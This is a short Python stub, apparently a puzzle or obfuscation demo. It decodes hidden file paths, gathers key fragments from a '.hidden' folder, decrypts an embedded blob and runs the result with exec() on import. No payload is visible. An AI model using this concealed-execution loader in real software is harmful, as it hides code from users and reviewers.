# Dorayaki Obfuscated Stub
import base64, os, hashlib, hmac
from pathlib import Path

_KEY_PARTS_OBF = ['wtmLhVWNkFjNyUzYmZmYhRmZ2UGO2EzL1YjYhNTZ3Q2MhF2Y5UWZ38iblRGZphmLv4iLv4iL', 'wtmL0EGO2UGMxcDNyYGZzcjZzQTZldzL1YjYhNTZ3Q2MhF2Y5UWZ38iblRGZphmLv4iLv4iL', 'wtmLiRGNygjYyQDMklTN1QmZ0gTNkFzL1YjYhNTZ3Q2MhF2Y5UWZ38iblRGZphmLv4iLv4iL', 'wtmLxUWNldDO2cDO2QWOjZjM3UmMjF2L1YjYhNTZ3Q2MhF2Y5UWZ38iblRGZphmLv4iLv4iL']
_BLOB_CHUNKS = ['iQ', 'Tf', 'Tt', 'l8', '1e', 'reK0dJ']

def _rev(s): return s[::-1]
def _read_key_parts():
    parts = []
    # FIX: Resolve relative to this file's directory
    base = Path(__file__).resolve().parent
    for obf in _KEY_PARTS_OBF:
        try:
            rel_path_str = base64.b64decode(_rev(obf)).decode('utf-8')
            p = base.joinpath(rel_path_str).resolve()
            parts.append(base64.b64decode(p.read_text('utf-8')))
        except Exception: pass
    return b''.join(parts)

def _keystream(key, nonce, length):
    out = bytearray(); counter = 0
    while len(out) < length:
        out.extend(hmac.new(key, nonce + counter.to_bytes(8,'big'), hashlib.sha256).digest())
        counter += 1
    return bytes(out[:length])

def _run():
    key = _read_key_parts()
    if not key: raise RuntimeError("Decryption Key not found (missing .hidden folder?)")
    blob = base64.b64decode(''.join([_rev(c) for c in _BLOB_CHUNKS]))
    nonce, ct = blob[:12], blob[12:]
    ks = _keystream(key, nonce, len(ct))
    plain = bytes(a ^ b for a, b in zip(ct, ks))
    try: src = plain.decode('utf-8')
    except: src = plain.decode('latin-1')
    exec(compile(src, __file__, 'exec'), globals())

_run()
